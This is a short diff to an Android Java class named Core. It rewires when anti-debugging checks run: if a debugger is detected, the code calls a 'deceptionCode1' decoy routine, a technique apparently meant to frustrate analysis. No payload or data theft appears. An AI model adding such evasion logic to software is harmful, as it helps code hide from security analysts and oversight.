@@ -753,7 +753,7 @@ public class Core extends Activity implements Runnable {
 	}
 
 	public boolean check() {
-		if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
+		if (!Cfg.DEBUG) {
 			AntiDebug ad = new AntiDebug();
 			if (ad.isDebug()) {
 				deceptionCode1();
@@ -770,7 +770,7 @@ public class Core extends Activity implements Runnable {
 	}
 	
 	public static boolean checkStatic() {
-		if (Cfg.DEBUG ||  Cfg.DEBUGANTI) {
+		if (!Cfg.DEBUG) {
 			AntiDebug ad = new AntiDebug();
 			if (ad.isDebug()) {
 				//deceptionCode1();
